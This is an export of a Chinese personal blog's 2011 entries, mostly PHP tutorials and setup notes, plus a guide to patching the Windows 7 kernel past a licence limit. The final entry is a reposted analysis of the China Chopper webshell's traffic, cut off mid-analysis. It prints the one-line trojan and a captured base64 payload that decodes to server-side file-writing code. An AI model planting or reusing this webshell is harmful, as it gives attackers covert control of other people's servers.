    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这几天都在逛寒川的博客，发现了很多好东西啊！这个就是他写的图片分页程序，就是把一个文件夹内的所有图片，分页显示出来！其中有很多php的库函数不熟悉！我一一查找到做了记录！以后自己留着好用，通过这个过程也学习到了不少知识，再次感谢寒川同学！ ————————————————————————————————————————————– &lt;?php echo “&lt;html&gt;&lt;head&gt;&lt;title&gt;图片&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=000000&gt;&lt;center&gt;&lt;font size=2 color=red&gt;”;//输出html相关代码 $page=$_GET[’page’];//获取当前页数 $max=3;//设置每页显示图片最大张数 $handle = opendir(’./’); //当前目录 &nbsp;&nbsp;&nbsp; while (false !== ($file = readdir($handle))) { //遍历该php文件所在目录 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; list($filesname,$kzm)=explode(“.”,$file);//获取文件扩展名 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if($kzm==”gif” or $kzm==”jpg” or $kzm==”JPG”) { //文件过滤 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!is_dir(’./’.$file)) { //文件夹过滤 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $array[]=$file;//把符合条件的文件名存入数组 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $i++;//记录图片总张数 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } &nbsp;&nbsp;&nbsp; } for ($j=$max&amp;#42$page;$j&lt;($max&amp;#42$page+$max)&amp;&amp;$j&lt;$i;++$j){//循环条件控制显示图片张数 &nbsp;&nbsp;&nbsp; echo “&lt;img widht=800 height=600 src=”$array[$j]”&gt;&lt;br&gt;”;//输出图片数组 } $Previous_page=$page-1; $next_page=$page+1; if ($Previous_page&lt;0){ &nbsp;&nbsp;&nbsp; echo “上页”; &nbsp;&nbsp;&nbsp; echo “&lt;a href=?page=$next_page&gt;下页&lt;/a&gt;”; } &nbsp;&nbsp;&nbsp; else if ($page&lt;=$i/$max){ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “&lt;a href=?page=$Previous_page&gt;上页&lt;/a&gt;”; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “&lt;a href=?page=$next_page&gt;下页&lt;/a&gt;”;} &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else{ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “ &lt;a href=?page=$Previous_page&gt;上页&lt;/a&gt;”; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “下页”; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } echo “&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;”; ?&gt; Opendir&lt;?xml:namespace prefix = o ns = “urn:schemas-microsoft-com:office:office” /&gt;&lt;o:p&gt;&lt;/o:p&gt; 函数描述：int opendir（string directory）； 返回值：函数opendir根据所给目录名directory返回一个目录句柄。 Readdir&lt;o:p&gt;&lt;/o:p&gt; 函数描述：string readdir（int directory_handle）； 返回值：函数readdir返回由目录句柄directory_handle指定目录中的下一个文件的文件名。 Explode&lt;o:p&gt;&lt;/o:p&gt; 函数描述：array explode（string separator，string string）； 返回值：函数explode返回一个字符串数组，数组元素是由参数separator分隔的参数string的各段内容。 Is_dir&lt;o:p&gt;&lt;/o:p&gt; 函数描述：int is_dir(string filename); 返回值：若给出的参数filename是一个目录，则函数is_dir返回true（1）；否则返回false（0）。 &nbsp;——————————————————————————————————————————————- 我试了试这段代码，如果在加上其他的一些处理就可以做成一个美观图片浏览页面！但是我还不是很会,以后再慢慢尝试～！ 留着修改！]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>分页</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP中的list(),each(),reset()函数应用]]></title>
    <url>%2F2011%2F08%2F14%2FPHP%E4%B8%AD%E7%9A%84list-each-reset-%E5%87%BD%E6%95%B0%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 百度的，留着以后肯定用的着！ ———————————————————————————- 1.list函数 list函数是把数组中的值赋给一些变量，语法如下： void list ( mixed $varname, mixed $varname… ) 像 array() 一样，这不是真正的函数，而是语言结构。list() 用一步操作给一组变量进行赋值。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注意: list() 仅能用于数字索引的数组并假定数字索引从 0 开始。 例1. list() 例子 代码： &lt;?php $arr=array(1,2,3); list($a,$b,$c)=$arr; echo “$a是$a,&lt;br/&gt;$b是$b,&lt;br/&gt;$c是$c.&lt;br/&gt;”; ?&gt; 显示为： $a是1, $b是2, $c是3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注意list函数的下标必须是数字，还必须是从0开始的。 2.each函数与reset函数 each 函数是返回数组中当前的键／值对并将数组指针向前移动一步，注意是一对，下面详细说明。 该函数语法： array each ( array &amp;$array ) 返回 array 数组中当前指针位置的键／值对并向前移动数组指针。键值对被返回为四个单元的数组，键 值为 0，1，key 和 value。单元 0 和 key 包含有数组单元的键名，1 和 value 包含有数据。如果内部 指针越过了数组的末端，则 each() 返回 FALSE。这里面为什么each函数有四个下表呢？其实each函 数得到这四个下标只是方便我们操作而已，我们可以用0,1作为索引，也可以用key,value作为索引。 例2：each例子 代码： &lt;?php $arr=array(“我是第一个值”,”我是第二个值”,”我是第三个值”); echo “当我们用0,1为索引时：&lt;br/&gt;&lt;br/&gt;”; $a=each($arr); echo “我在$arr数组中的位置为：”.$a[’0’]; echo “&lt;br/&gt;”; echo “我在$arr数组中的值为：”.$a[’1’]; echo “&lt;br/&gt;&lt;br/&gt;”; echo “当我们用key,value为索引时：&lt;br/&gt;&lt;br/&gt;”; $b=each($arr); echo “我在$arr数组中的位置为：”.$b[’key’]; echo “&lt;br/&gt;”; echo “&nbsp;&nbsp;&nbsp;&nbsp; 我在$arr数组中的值为：”.$b[’value’]; ?&gt; 显示为： 当我们用0,1为索引时： 我在$arr数组中的位置为：0 我在$arr数组中的值为：我是第一个值 当我们用key,value为索引时： 我在$arr数组中的位置为：1 我在$arr数组中的值为：我是第二个值 还可用each函数与list函数结合来遍历数组，如下例： 例3： &lt;?php $fruit = array(’a’ =&gt; ’apple’, ’b’ =&gt; ’banana’, ’c’ =&gt; ’cranberry’); reset($fruit); while (list($key, $val) = each($fruit)) { &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo “$key =&gt; $val“; } ?&gt; 显示为： a =&gt; apple b =&gt; banana c =&gt; cranberry 这里要注意list函数的下标必须是数字，还必须是从0开始的。 里面的reset函数解释： 在执行 each() 之后，数组指针将停留在数组中的下一个单元或者当碰到数组结尾时停留在最后一个单元。如果要再用 each 遍历数组，必须使用 reset()。 如果是第一次遍历数组可以不用。 详细说一下reset函数： reset 是将数组的内部指针指向第一个单元，语法为： mixed reset ( array &amp;$array ) reset() 将 array 的内部指针倒回到第一个单元并返回第一个数组单元的值，如果数组为空则返回 FALSE。 可以将上面的例2与下面的例子对比一下，就很容易明白了。。。、 代码： &lt;?php $arr=array(“我是第一个值”,”我是第二个值”,”我是第三个值”); echo “当我们用0,1为索引时：&lt;br/&gt;&lt;br/&gt;”; $a=each($arr); echo “我在$arr数组中的位置为：”.$a[’0’]; echo “&lt;br/&gt;”; echo “&nbsp;&nbsp;&nbsp;&nbsp; 我在$arr数组中的值为：”.$a[’1’]; echo “&lt;br/&gt;&lt;br/&gt;”; echo “当我们用key,value为索引时：&lt;br/&gt;&lt;br/&gt;”; reset($arr); $b=each($arr); echo “我在$arr数组中的位置为：”.$b[’key’]; echo “&lt;br/&gt;”; echo “&nbsp;&nbsp;&nbsp;&nbsp; 我在$arr数组中的值为：”.$b[’value’]; ?&gt; 显示为： 当我们用0,1为索引时： 我在$arr数组中的位置为：0 我在$arr数组中的值为：我是第一个值 当我们用key,value为索引时： 我在$arr数组中的位置为：0 我在$arr数组中的值为：我是第一个值&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//注意例2中的这一行显示，就明白了。]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>each()</tag>
        <tag>list()</tag>
        <tag>reset()</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[让ul中li分列显示]]></title>
    <url>%2F2011%2F08%2F13%2F%E8%AE%A9ul%E4%B8%ADli%E5%88%86%E5%88%97%E6%98%BE%E7%A4%BA%2F</url>
    <content type="text"><![CDATA[让ul中li分列显示，这个困挠很久的一个问题得以圆满解决，写下来，以备以后不时之需。用li显示两列如下（要显视多列的自己想办法，哈哈）： &lt;ul&gt; &nbsp; &lt;li style=”display:block;float:left;width:50%”&gt;&lt;a href=”url”&gt; afaf&lt;/a&gt; &lt;/li&gt; &nbsp; &lt;li style=”display:block;float:left;width:50%”&gt;&lt;a href=”url”&gt; afaf&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; float真是有 ps:淘过来的小技巧！]]></content>
      <categories>
        <category>HTML|CSS|JS|xss|xml</category>
      </categories>
      <tags>
        <tag>li</tag>
        <tag>ul</tag>
        <tag>小技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[32位win7系统支持4g内存办法]]></title>
    <url>%2F2011%2F08%2F13%2F32%E4%BD%8Dwin7%E7%B3%BB%E7%BB%9F%E6%94%AF%E6%8C%814g%E5%86%85%E5%AD%98%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[以前也有打算买个内存，买个1g的内存感觉以后换电脑不怎么好（浪费了），由于我的电脑是32位win7系统，买个2g的内存又发挥不到他的优势，大家都知道64的系统好多软件不兼容，于是查了资料看看有没有使的32位支持4g方法。以下是找到的一篇破解方法的最新文章。 [其实不足4GB内存的原因就在32位X86架构。32位X86架构是指个人电脑的地址总线是32位的，CPU、内存控制器、操作系统都是按32位地址总线设计。32位地址总线可以支持的内存地址代码是4096MB。这4GB个地址码正好可以分配给4GB内存。但是其它寄存器都需要系统分配给它们地址代码，所以总容量为4GB的内存就有一部分内存分配不到地址代码而不能使用。 其实，Vista/Win7自身完全支持超过4GB大内存，只是微软不让使用而已。但其实在Win7上可以通过程序破解Windows PAE内核文件ntkrnlpa.exe，绕过Zw Query License Value API函数的许可限制，让32位的VISTA/Win7支持超过4GB物理内存，下面笔者就教您如何破解4GB内存之谜。 第2页：Win7破解4GB内存轻松三步搞定 首先，我们需要下载一款名叫Readyfor 4GB的软件，用户可以在搜索工具上搜索，下载地址有很多。 下载解压后，先运行Readyfor 4GB，当程序打开后，依次点击检查和应用选项，此时程序会告诉你所用系统能够支持最大内存容量和当前内存容量。一下的图片是笔者已经破解后所示，最大允许4GB内存。 然后运行压缩包里面的AddBootMenu程序，当弹出对话框时，输入Y回车即可，此时系统提示破解操作成功完成。 第三步依次选择我的电脑右键→属性→高级系统设置→启动和故障恢复→设置→选择那个破解的启动系统就可以，如下图。 **最后重新启动计算机，在选择我的电脑属性后，内存被识别成4GB容量。 下面我们就来看看破解后的4GB容量内存性能和64位Win7下4GB容量内存的性能差别有多大。** 第3页：破解后32位Win7系统性能表现对比 ◎ SiSoftware Sandra2009测试 这是一套功能强大的系统分析评测工具，拥有超过30种以上的测试项目，主要包括有 CPU、Drives、CD-ROM/DVD、Memory、SCSI、APM/ACPI、鼠标、键盘、网络、主板、打印机等。全面支持当前各种 VIA、ALI 芯片组和 Pentium 4、AMD DDR平台。除了具有强大的功能外，使用也很方便，易于上手。 从测试中看出，虽然64位Windows7可以完美支持4GB容量内存，但是成绩和32位Windows7并没有多大变化，可见没有良好64位软件的支持，根本无法发挥64位操作系统的性能。 全文总结：通过简单的三个步骤就可以让我们最常用的32位Win7可以轻松支持到4GB内存，对于拥有4GB以上内存的用户的确是个好消息。而且我们也发现，虽然64位操作系统的Windows 7可以支持更大容量内存，但是仅在4GB容量上并没有领先破解后的32位Win7，所以想通过64位Win7支持4GB容量内存的用户暂且不必升级，毕竟现在兼容上64bit还存在一些兼容问题，所以感性的用户可以体验一下这种方法。 这篇文章来自http://tech.sina.com.cn/h/2010-01-21/05401223748.shtml] ??????????????????????????????- ps:我从备天哪儿淘过来的，先记录在这儿留着以后用！呵呵！]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>32位系统</tag>
        <tag>4G</tag>
        <tag>内存.WIN7</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[调整PHP和MySQL的时区，实现同步显示中国时间]]></title>
    <url>%2F2011%2F08%2F12%2F%E8%B0%83%E6%95%B4PHP%E5%92%8CMySQL%E7%9A%84%E6%97%B6%E5%8C%BA%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%90%8C%E6%AD%A5%E6%98%BE%E7%A4%BA%E4%B8%AD%E5%9B%BD%E6%97%B6%E9%97%B4%2F</url>
    <content type="text"><![CDATA[现在很多朋友购买国外主机，可是国外主机显示的是当地时间，如何设置成国内时间呢？所谓的时间问题归根结底也就是“时区”问题，我们首先要知道的是：1、美国时间和中国时间相差应该是8小时。2、PHP的时间和MySQL的时间不是相同的。所以，我们所要做的事情就是：1、把美国时间改成中国时间。2、并且要把PHP的时间和MySQL的时间统一。一、修改PHP时间听上去有点小复杂，其实很简单。首先我们来改PHP的时间，将这句代码插入到PHP程序中，公共调用页的顶部(也就是要include_once，require_once到的脚本里，当然你不用_once我也没有意见)，确保需要用到时间的页面都必须调用到：复制内容到剪贴板代码:date_default_timezone_set(’PRC’) or die(’时区设置失败，请联系管理员！’);现在测试下：复制内容到剪贴板代码:echo date(’Y-m-d H:i:s’);怎么样？哇哈哈，正确显示中国时间了，当然你要说北京时间我也没意见。至于那个参数PRC是什么意思，我记得是某个神奇的土地之缩写，不用管它，照搬就行了，错不了的。成功了？NO，不要得意得太早，在MySQL里输入语句SELECT NOW();你会惊愕的发现，MySQL的时间还是美国时间。不急，我们继续下一步。二、修改MySQL时间如果你在写程序的时候，习惯了用类或者函数，那么恭喜你，这一步你同样只需要一次复制粘贴操作就能将它解决。如果你在写程序的从来不用类或者函数，那么我会祈祷耶稣和释迦牟尼一同保佑你，不会在改程序的时候累得很惨，同时希望你改掉这个不好的编程习惯。那么，就请在PHP程序有数据库连接的下一语句(只有1次，就加1句；若有无数次，就加无数次……这个编程习惯，还是重要啊)加入如下代码：复制内容到剪贴板代码:mysql_query(“SET time_zone = ’+8:00’”) or die(’时区设置失败，请联系管理员！’);再去SELECT NOW();下，你会惊喜地发现，MySQL也是中国时间了。为什么是+8:00呢？前面我说过了，中国时间和美国时间差8小时，往那个那个貌似向东还是向西的方向来着？(不好意思我是路盲，我在怪地球是圆的)。OK，现在MySQL的时间也搞定了，我相信现在就会有比较严谨朋友问了：那你如何证明PHP的时间和MySQL的时间是同步呢？啊……这个人与人之间的信任，还是重要的，就像汇款，哈哈，那我们来做个测试吧：复制内容到剪贴板代码://这里是页面的开头，用于改PHP时间的代码。date_default_timezone_set(’PRC’) or die(’时区设置失败，请联系管理员！’);//————————————————————-//// 这里写数据库连接的代码，别懒，自己写。////————————————————————-//数据库一旦连接，紧跟着就是改MySQL时间的代码。mysql_query(“SET time_zone = ’+8:00’”) or die(’时区设置失败，请联系管理员！’);//显示PHP的时间echo date(’Y-m-d H:i:s’);echo//显示MySQL的时间$mysql_time = mysql_query(“SELECT NOW()”);$mysql_rows = mysql_fetch_row($mysql_time);echo $mysql_rows[0];有用的东西就要果断复制粘贴回来，以备不时之需！此文寒窗摘自百度，我摘自他的博客 （～～）]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP 获取系统信息，PHP 获取服务器详细信息『转载』]]></title>
    <url>%2F2011%2F08%2F12%2FPHP-%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%EF%BC%8CPHP-%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E3%80%8E%E8%BD%AC%E8%BD%BD%E3%80%8F%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 四处收集PHP学习知识，以后肯定用得着！这个是在寒川的博客上看见的！ 获取系统类型及版本号：&nbsp;&nbsp;&nbsp; php_uname()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (例：Windows NT COMPUTER 5.1 build 2600) 只获取系统类型：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; php_uname(’s’)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (或：PHP_OS，例：Windows NT) 只获取系统版本号：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; php_uname(’r’)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (例：5.1) 获取PHP运行方式：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; php_sapi_name()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (PHP run mode：apache2handler) 获取前进程用户名：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Get_Current_User() 获取PHP版本：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP_VERSION 获取Zend版本：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Zend_Version() 获取PHP安装路径：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DEFAULT_INCLUDE_PATH 获取当前文件绝对路径：&nbsp;&nbsp;&nbsp; FILE 获取Http请求中Host值：&nbsp;&nbsp;&nbsp; $_SERVER[“HTTP_HOST”]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (返回值为域名或IP) 获取服务器IP：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GetHostByName($_SERVER[’SERVER_NAME’]) 接受请求的服务器IP：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $_SERVER[“SERVER_ADDR”]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (有时候获取不到，推荐用：GetHostByName($_SERVER[’SERVER_NAME’])) 获取客户端IP：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $_SERVER[’REMOTE_ADDR’] 获取服务器解译引擎：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $_SERVER[’SERVER_SOFTWARE’] 获取服务器CPU数量：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $_SERVER[’PROCESSOR_IDENTIFIER’] 获取服务器系统目录：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $_SERVER[’SystemRoot’] 获取服务器域名：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $_SERVER[’SERVER_NAME’]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (建议使用：$_SERVER[“HTTP_HOST”]) 获取用户域名：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $_SERVER[’USERDOMAIN’] 获取服务器语言：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $_SERVER[’HTTP_ACCEPT_LANGUAGE’] 获取服务器Web端口：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $_SERVER[’SERVER_PORT’] &nbsp; 此文摘自：http://www.huikon.cn/post-246.html]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[看着有那么点伤感]]></title>
    <url>%2F2011%2F08%2F12%2F%E7%9C%8B%E7%9D%80%E6%9C%89%E9%82%A3%E4%B9%88%E7%82%B9%E4%BC%A4%E6%84%9F%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>视频|音乐</category>
      </categories>
      <tags>
        <tag>视频</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【php】strstr、stristr、strpos这三个函数的区别『转载』]]></title>
    <url>%2F2011%2F08%2F12%2F%E3%80%90php%E3%80%91strstr%E3%80%81stristr%E3%80%81strpos%E8%BF%99%E4%B8%89%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84%E5%8C%BA%E5%88%AB%E3%80%8E%E8%BD%AC%E8%BD%BD%E3%80%8F%2F</url>
    <content type="text"><![CDATA[strstr – 返回字符串中从某指定字符开始到结束处的字符串。 语法： string strstr ( string haystack, string needle) 返回haystack中从needle开始到结束的字符串. 如果没有返回值，即没有发现needle，则返回FALSE &nbsp; 注: 这个函数是大小写敏感的。 &nbsp; **stristr与strstr 的区别就是stristr不分区大小写。 **&nbsp; 相对于前两者查找成功后返回的是字符，strpos查找成功后则是返回的是位置。因为位置有可能是0，所以判断查找失败使用===false更合适。 strpos的性能比较好，如果只是判断needle是否在字符串haystack中，则使用strpos较好，它将占用更少的内存和获得更快的执行速度。但是strpos对特殊字符支持不好，比如对中文就不能很好支持。 &nbsp; 此文转载至：http://simue.com/blog/php-mysql/strstr-stristr-strpos-the-difference-in-php.html]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[继续我的emlog之旅]]></title>
    <url>%2F2011%2F08%2F12%2F%E7%BB%A7%E7%BB%AD%E6%88%91%E7%9A%84emlog%E4%B9%8B%E6%97%85%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 从几天前我下载了emlog以来，emlog给我的第一感觉就是简洁，不光是主题简洁，代码也很简洁,&nbsp;因为我这个php小菜都能看懂一些，这几天一直在折腾他。 &nbsp;&nbsp;&nbsp;&nbsp; 想想这几天的收获，好像使我对php又有了更深入的认识，看了下emlog的模板和插件开发手册，让我有点激情澎湃，想有一天能够开发一个自己的模板和自己插件，用自己学习的知识来完善自己的博客。 &nbsp;&nbsp;&nbsp;&nbsp; 唉！我这个脑袋写文字就是有那么点不灵光，如果你不幸看见了我的日志，在这先说声感谢，再说声对不起了，我以后一定会加强写流水帐的功底，至少让您看着不纠结。 &nbsp;&nbsp;&nbsp; 博客建起已经几天了，修修改改，在实践中学习到了不少！ &nbsp;&nbsp;&nbsp; 就这么多了吧！实在是写不出什么了！ &nbsp;&nbsp;&nbsp; 谢谢正在看我博客的您！&nbsp;]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>学习之旅</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[全价87元人名币的的网站]]></title>
    <url>%2F2011%2F08%2F09%2F%E5%85%A8%E4%BB%B787%E5%85%83%E4%BA%BA%E5%90%8D%E5%B8%81%E7%9A%84%E7%9A%84%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[昨日在T哥的指导下我搭建一个自己第一个正规的博客 访问速度不错而且只花了87元 空间是300m 送300m的数据库&nbsp; 39元 .com的国际域名 48元 总计：87元 &nbsp;]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>域名</tag>
        <tag>建站</tag>
        <tag>空间</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中国菜刀通讯加密分析『转载』]]></title>
    <url>%2F2011%2F08%2F08%2F%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E9%80%9A%E8%AE%AF%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90%E3%80%8E%E8%BD%AC%E8%BD%BD%E3%80%8F%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 今天在土司看到有人说菜刀有后门，正好我前段时间对菜刀一句话通讯做过分析，借此发篇文章献丑了。 说明：菜刀用post与服务端通讯，各种语言的加密方法都一样的，仅执行代码不同，这里仅以PHP为例。 其实菜刀的通讯加密并不是很复杂，仅用到base64_encode()函数，但是它的加密手法非常巧妙。 一般POST到服务器的数据，就算加密过了，我们也能用echo $_POST[’pass’]的方法得到加密后的数据， 所以我分析时在服务器上的“一句话”后面加了段代码，让所有$_POST[’pass’]的内容都各自保存到一个txt文本。 但用菜刀执行一些操作后，发现服务端保存的txt文本里都只有一句代码：“@eval(base64_decode($_POST[z0]));”。 这是它的加密手法之一：POST里包含POST，这样即使管理员发现一句话木马，也无法截取到你执行了什么代码。 服务端突破基本无望，只能本地抓包了，下面这段代码是用抓包工具抓到新建文件的POST数据。(pass是一句话里的post变量名) pass=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO 0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztlY2hvIEB md3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pLCJ3IiksYmFzZTY0X2RlY29kZSgkX1BPU1RbIno yIl0pKT8iMSI6IjAiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=RDpcXFdXV1xcd3d3XFxOZXdGaWxlLnR4dA%3D %3D&amp;z2=dGVzdA%3D%3D 可以看到不止发送一个POST变量(POST变量用&amp;分割)，而一句话木马的POST执行的是$_POST[z0]，这是第二个POST的变量z0， 可以看出z0变量经过base64_encode()加密，所以要先解密z0变量，用base64_decode()函数解密z0得到如下： @ini_set(“display_errors”,”0″);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-6 ?木??? ????蝌 ?? 恚????}A=MQl??t什???? 恚????}A=MQl??t中??????□???欠 ?木? 只解密出了前三句代码，后面全是乱码，这里我找了一晚上都没找到问题出在哪，看起来加密代码应该没有问题， 因为前面的pass变量可以看出是直接用base64_decode()解密用eval执行的，如果有经过其他加密处理就没无法执行代码了。 直到第二天才发现问题所在，这是他的第二个加密手法：利用服务器接收POST数据时自动将经过url编码处理的字符串还原。 各位仔细看z0变量里的加密代码，会发现有两个%符号，而base64编码是不支持%符号的，带%的一般是url编码。 我把%2B和%3D用urldecode()函数还原分别是+号和=号，替换到加密代码里再用base64_decode()解密得到了完整代码： @ini_set(“display_errors”,”0″); @set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-&gt;|”);; echo @fwrite(fopen(base64_decode($_POST[“z1”]),”w”),base64_decode($_POST[“z2”]))?”1″:”0″;; echo(“|&lt;-”);die(); 而在这段代码又包含了两个POST变量，$_POST[’z1’]和$_POST[’z2’]，这是第三层POST包含了，且也经过base64加密和url编码。 从先前抓的数据包找到这两个变量，先还原里面的url编码字符，再用base64_decode()解密，得到如下 